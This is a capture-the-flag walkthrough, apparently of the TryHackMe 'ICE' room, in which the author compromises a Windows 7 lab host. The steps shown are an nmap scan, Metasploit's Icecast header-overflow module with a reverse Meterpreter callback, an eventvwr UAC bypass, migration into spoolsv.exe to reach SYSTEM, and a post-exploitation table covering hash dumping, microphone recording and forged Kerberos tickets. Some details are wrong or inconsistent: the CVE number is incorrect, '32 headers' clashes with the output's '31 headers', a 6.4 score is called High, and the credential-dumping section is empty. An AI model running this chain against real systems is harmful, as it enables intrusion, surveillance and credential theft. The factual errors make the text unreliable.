Phase 01

Reconnaissance - A Windows Target Changes Everything

My nmap approach shifts slightly for Windows targets. Windows runs services on non-standard ports - RDP, SMB, WinRM - and the OS detection flag -O gives me confirmation early rather than inferring from service names later. I'm also scanning all 65,535 ports with -p- because Windows hosts frequently run services on unusual high ports.

nmap - full port scan
nmap -sC -sS -sV -p- -O -T4 <TARGET_IP>

# -sC → default script suite (grabs banners, checks common vulns)
# -sS → SYN scan (stealthy, doesn't complete TCP handshake)
# -sV → service version detection
# -p- → all ports, not just top 1000
# -O → OS fingerprinting
# -T4 → aggressive timing (assumes stable network)

PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
445/tcp open microsoft-ds Windows 7 SP1
8000/tcp open http Icecast streaming media server
3389/tcp open ssl/ms-wbt-server (RDP)
... 5 additional ports ...

OS: Windows 7 SP1
Hostname: DARK-PC
💡

Ten open ports. The one that immediately stands out is port 8000 running Icecast - a media streaming server. Icecast is not a core Windows service, which means someone installed it deliberately. Non-standard third-party software running on a production machine is almost always the weakest link in the chain. That's where I'm going first.

The hostname DARK-PC also tells me this is a single workstation, not a domain controller - important context for what post-exploitation looks like.

Phase 02

Vulnerability Research - Finding the Right CVE

Before I fire up Metasploit, I want to understand what I'm exploiting and why it works. Blindly running modules is how people get caught - or worse, break production systems on real engagements. Looking up the CVE first is a discipline I try to maintain.

A quick search for "Icecast vulnerability" surfaces CVE-2004-9091 immediately. Here's what the vulnerability actually is:

CVE-2004-9091
6.4 (High)
HTTP Header Overflow
Network (unauthenticated)
🔍

What the vulnerability actually does: Icecast's HTTP request handler fails to properly validate the number of headers in an incoming request. By sending a request with exactly 32 headers, an attacker can overflow a stack buffer and overwrite the saved return address - a classic stack-based buffer overflow. The attacker controls where execution jumps next. No authentication required. Full code execution from the network.

This is why old, unpatched software running on exposed ports is so dangerous. Icecast had a patch for this. The machine never applied it. That gap is the entire attack surface.

Phase 03

Exploitation - Metasploit, Used Deliberately

Metasploit gets a bad reputation in some circles - seen as a crutch that prevents real learning. I disagree with that framing. Metasploit is a professional tool used by red teams and pentesters daily. The skill is knowing which module to use, why, and what it's doing under the hood.

msfconsole
msfconsole

msf6 > search icecast

Matching Modules
================
0 exploit/windows/http/icecast_header 2004-09-28 great Yes Icecast Header Overflow

msf6 > use exploit/windows/http/icecast_header
msf6 exploit(icecast_header) > show options

Name Current Setting Required Description
---- --------------- -------- -----------
RHOSTS yes Target IP
RPORT 8000 yes Target port (default: 8000)
LHOST yes Your machine IP
LPORT 4444 yes Callback port
⚠️

Always check LHOST manually. Metasploit sometimes auto-populates LHOST with a loopback address (127.0.0.1) or the wrong interface. On TryHackMe, my LHOST must be my VPN-assigned tun0 IP - not my local LAN address. A wrong LHOST is the most common reason a shell silently fails to connect back.

setting options and firing
msf6 exploit(icecast_header) > set RHOSTS <TARGET_IP>
msf6 exploit(icecast_header) > set LHOST <YOUR_VPN_IP>
msf6 exploit(icecast_header) > run

[*] Started reverse TCP handler on <YOUR_IP>:4444
[*] Sending 31 headers...
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: DARK-PC\dark

meterpreter > sysinfo
Computer : DARK-PC
OS : Windows 7 (Build 7601, Service Pack 1)
Architecture: x64
💡

I'm in as user dark - a standard user, not an administrator. This is a common landing position: code execution, but limited privilege. The machine is Windows 7 SP1 (Build 7601) - a goldmine for privilege escalation vectors, since Windows 7 reached end-of-life in 2020 and accumulates unpatched vulnerabilities rapidly. The x64 architecture matters - it determines which payloads and migration targets are compatible.

Phase 04

Privilege Escalation - Bypassing UAC

Running as a standard user, I need to escalate. Metasploit includes a post-exploitation module that automatically suggests escalation paths based on the target's running processes and OS version.

local exploit suggester
meterpreter > run post/multi/recon/local_exploit_suggester

[*] Running checks against session 1...
[+] exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] exploit/windows/local/ms10_015_kitrap0d: ...
[+] exploit/windows/local/ms10_092_schelevator: ...

The first suggestion - bypassuac_eventvwr - is the one I'll use. Here's what it actually does: Windows' Event Viewer (eventvwr.exe) is a trusted process that auto-elevates without triggering a UAC prompt. This module hijacks the registry path that Event Viewer reads on launch, substituting it with a malicious path pointing to our payload. When Event Viewer runs (which it does silently), it executes our code with elevated privileges.

UAC bypass
# Background current session, preserve it for later
meterpreter > background
[*] Backgrounding session 1...

msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 exploit(bypassuac_eventvwr) > set SESSION 1
msf6 exploit(bypassuac_eventvwr) > set LHOST <YOUR_VPN_IP>
msf6 exploit(bypassuac_eventvwr) > run

[*] Meterpreter session 2 opened (elevated)

meterpreter > getprivs
SeTakeOwnershipPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
... additional privileges ...
💡

SeTakeOwnershipPrivilege is the one to note. It allows the token holder to take ownership of any securable object - files, registry keys, processes - regardless of the existing ACL. In a real environment, this privilege alone could enable an attacker to read any file on the system, including SAM databases and sensitive documents.

Phase 05

Process Migration - Becoming SYSTEM

Elevated privileges aren't the same as SYSTEM. To access LSASS (which holds cached credentials), I need to run as NT AUTHORITY\SYSTEM and match LSASS's architecture. The approach: migrate my Meterpreter session into a SYSTEM process that runs as x64.

  • Run ps to list all running processes with their PID, architecture, and owner
  • Identify a process running as NT AUTHORITY\SYSTEM in x64 architecture
  • spoolsv.exe (Print Spooler) meets both criteria - always present, always SYSTEM, x64
  • Migrate into it; my session now inherits SYSTEM-level privileges
process migration
meterpreter > ps

PID Name Arch User
--- ---- ---- ----
1272 spoolsv.exe x64 NT AUTHORITY\SYSTEM
... lsass.exe x64 NT AUTHORITY\SYSTEM

meterpreter > migrate 1272
[*] Migrating from 2180 to 1272...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
⚠️

Why not migrate directly into lsass.exe - Migrating into LSASS itself is risky - if the migration causes LSASS to crash, Windows triggers an automatic reboot (it's a critical process). spoolsv.exe is stable, always running, and grants the same SYSTEM token we need. It's the safer route to the same destination.

Phase 06

Credential Dumping - Kiwi and the LSASS Cache

Now running as SYSTEM, I load kiwi - the Meterpreter implementation of Mimikatz. Mimikatz exploits the way Windows caches credentials in LSASS memory to expose plaintext passwords, hashes, and Kerberos tickets. It's one of the most consequential tools in post-exploitation.

kiwi - credential extraction

Post-Exploitation Capabilities - The Toolkit

With SYSTEM-level Meterpreter, the post-exploitation surface is extensive. Here are the key capabilities I explored, grouped by what they enable in a real engagement:

Command What it does Real-world relevance
hashdump Dumps all local SAM password hashes Pass-the-hash attacks, offline cracking, lateral movement
screenshare Streams the target's live desktop Surveillance, capturing credentials typed in real time
record_mic Records audio from attached microphone Covert intelligence gathering in physical environments
timestomp Modifies file timestamps Anti-forensics - hiding when files were created or accessed
golden_ticket_create Forges Kerberos authentication ticket Persistent domain access even after password resets (AD environments)
🖥️

On RDP as a persistence mechanism: The credentials we dumped work over RDP (port 3389 was open in our initial scan). On real engagements this is significant - but it carries a risk. Windows workstations enforce single-session RDP by default. Connecting via RDP while the legitimate user is active kicks them off their own machine. On a covert engagement, that's an immediate detection event. Knowing when not to use a capability is as important as knowing you have it.

Reflections

What ICE Actually Taught Me

The ICE room looks simple on the surface - run nmap, fire an exploit, escalate, dump creds. But the underlying lessons are deeper than the steps suggest.

The first is about unpatched software as organisational risk. CVE-2004-9091 is twenty years old. The fix existed. The reason this machine was vulnerable had nothing to do with the attacker's sophistication - it was entirely an operational failure. In my penetration testing work, I've seen similar patterns: companies running current Windows versions with ancient third-party software that never gets patched because it's "working fine." Icecast on a media server. Legacy Java on a dev machine. These are the doors that stay unlocked.

The second is about privilege as a layered problem. Getting code execution doesn't mean you own the machine. Getting elevated privileges doesn't mean you're SYSTEM. Each layer requires its own technique, its own awareness of architecture compatibility, its own caution about side effects. The migration step especially - understanding why spoolsv.exe and not lsass.exe - that distinction only comes from actually understanding what these processes are, not just following a walkthrough.

Windows post-exploitation is a discipline in itself. I'll be returning to it.
